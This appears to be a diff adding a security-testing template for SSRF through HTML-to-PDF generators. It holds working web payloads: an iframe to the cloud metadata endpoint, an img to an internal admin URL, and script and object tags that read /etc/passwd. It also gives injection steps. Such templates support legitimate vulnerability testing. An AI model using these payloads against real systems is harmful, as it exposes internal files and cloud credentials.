@@ -1,0 +1,20 @@
+id: PDF_SSRF
+name: SSRF via PDF Generation
+cwe:
+- CWE-918
+owasp: A10:2021 SSRF
+severity_range: High - Critical
+description: HTML-to-PDF converters (wkhtmltopdf, Puppeteer, Prince) execute embedded HTML and fetch URLs server-side.
+detection:
+  payloads:
+  - <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+  - <img src="http://internal-service/admin">
+  - <script>fetch("file:///etc/passwd").then(r=>r.text()).then(t=>document.body.innerHTML=t)</script>
+  strategy:
+  - Find features that generate PDFs from user content (invoices, reports, exports)
+  - Inject HTML/JS that fetches internal URLs
+  - Inject <iframe> to AWS/GCP metadata endpoints
+  - Inject <object data='file:///etc/passwd'> for local file read
+evidence_needed: Internal service content or file content appearing in generated PDF
+references:
+- https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
